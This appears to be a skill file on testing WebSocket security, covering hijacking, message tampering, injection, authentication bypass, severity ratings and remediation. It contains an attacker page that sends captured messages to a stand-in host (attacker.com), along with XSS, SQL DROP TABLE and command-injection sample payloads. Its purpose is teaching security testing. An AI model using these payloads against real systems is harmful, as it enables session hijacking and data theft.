---
name: websocket_security
description: WebSocket security testing covering cross-site WebSocket hijacking, input validation, and authentication bypass
---

# WebSocket Security

WebSockets maintain persistent bidirectional connections and are often exempt from the same security controls applied to HTTP endpoints, making them a high-value attack surface.

## Attack Surface

**Connection Weaknesses**
- Missing `Origin` header validation → Cross-Site WebSocket Hijacking (CSWSH)
- No authentication token in handshake (relies on cookies without `SameSite`)
- Upgrade endpoint accessible without session validation

**Message-Level Issues**
- Unsanitized messages processed as commands or SQL/OS calls
- JSON message injection (parameter tampering, privilege escalation)
- XSS via WebSocket message reflected into DOM
- Binary protocol manipulation

## Testing Methodology

### Step 1 – Inspect Handshake
```
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://target.com
```
Capture in Burp; note cookies and any auth tokens in the request.

### Step 2 – Cross-Site WebSocket Hijacking (CSWSH)
Create attacker page:
```html
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(e) {
  fetch("https://attacker.com/log?d=" + btoa(e.data));
};
</script>
```
If the server accepts cross-origin connections using session cookies, sensitive data is stolen.

### Step 3 – Change Origin Header in Burp
Intercept the WebSocket upgrade request and change `Origin` to `https://attacker.com`. If the server still upgrades, origin validation is absent.

### Step 4 – Message Injection / Tampering
After connecting, modify message fields:
```json
{"action": "getUser", "userId": "1"}
→ {"action": "getUser", "userId": "2"}
```
Look for IDOR, privilege escalation, or injections in message payloads.

### Step 5 – Injection via Messages
```json
{"message": "<img src=x onerror=alert(1)>"}
{"query": "'; DROP TABLE users; --"}
{"cmd": "ls /"}
```

### Step 6 – Authentication Bypass
Try connecting to `wss://target.com/ws` without cookies or with expired tokens. Check if the server allows unauthenticated message processing.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| CSWSH leaking sensitive user data | High |
| Authentication bypass on WebSocket endpoint | High |
| Command/SQL injection via messages | Critical |
| XSS via reflected WebSocket message | Medium–High |
| IDOR via message tampering | Medium |

## Remediation

- Validate `Origin` header server-side against an explicit allowlist
- Require an explicit auth token (not just session cookie) in the WebSocket handshake
- Apply the same input validation to WebSocket messages as HTTP endpoints
- Use `SameSite=Strict` cookies to prevent CSWSH
- Implement per-connection rate limiting and message size limits
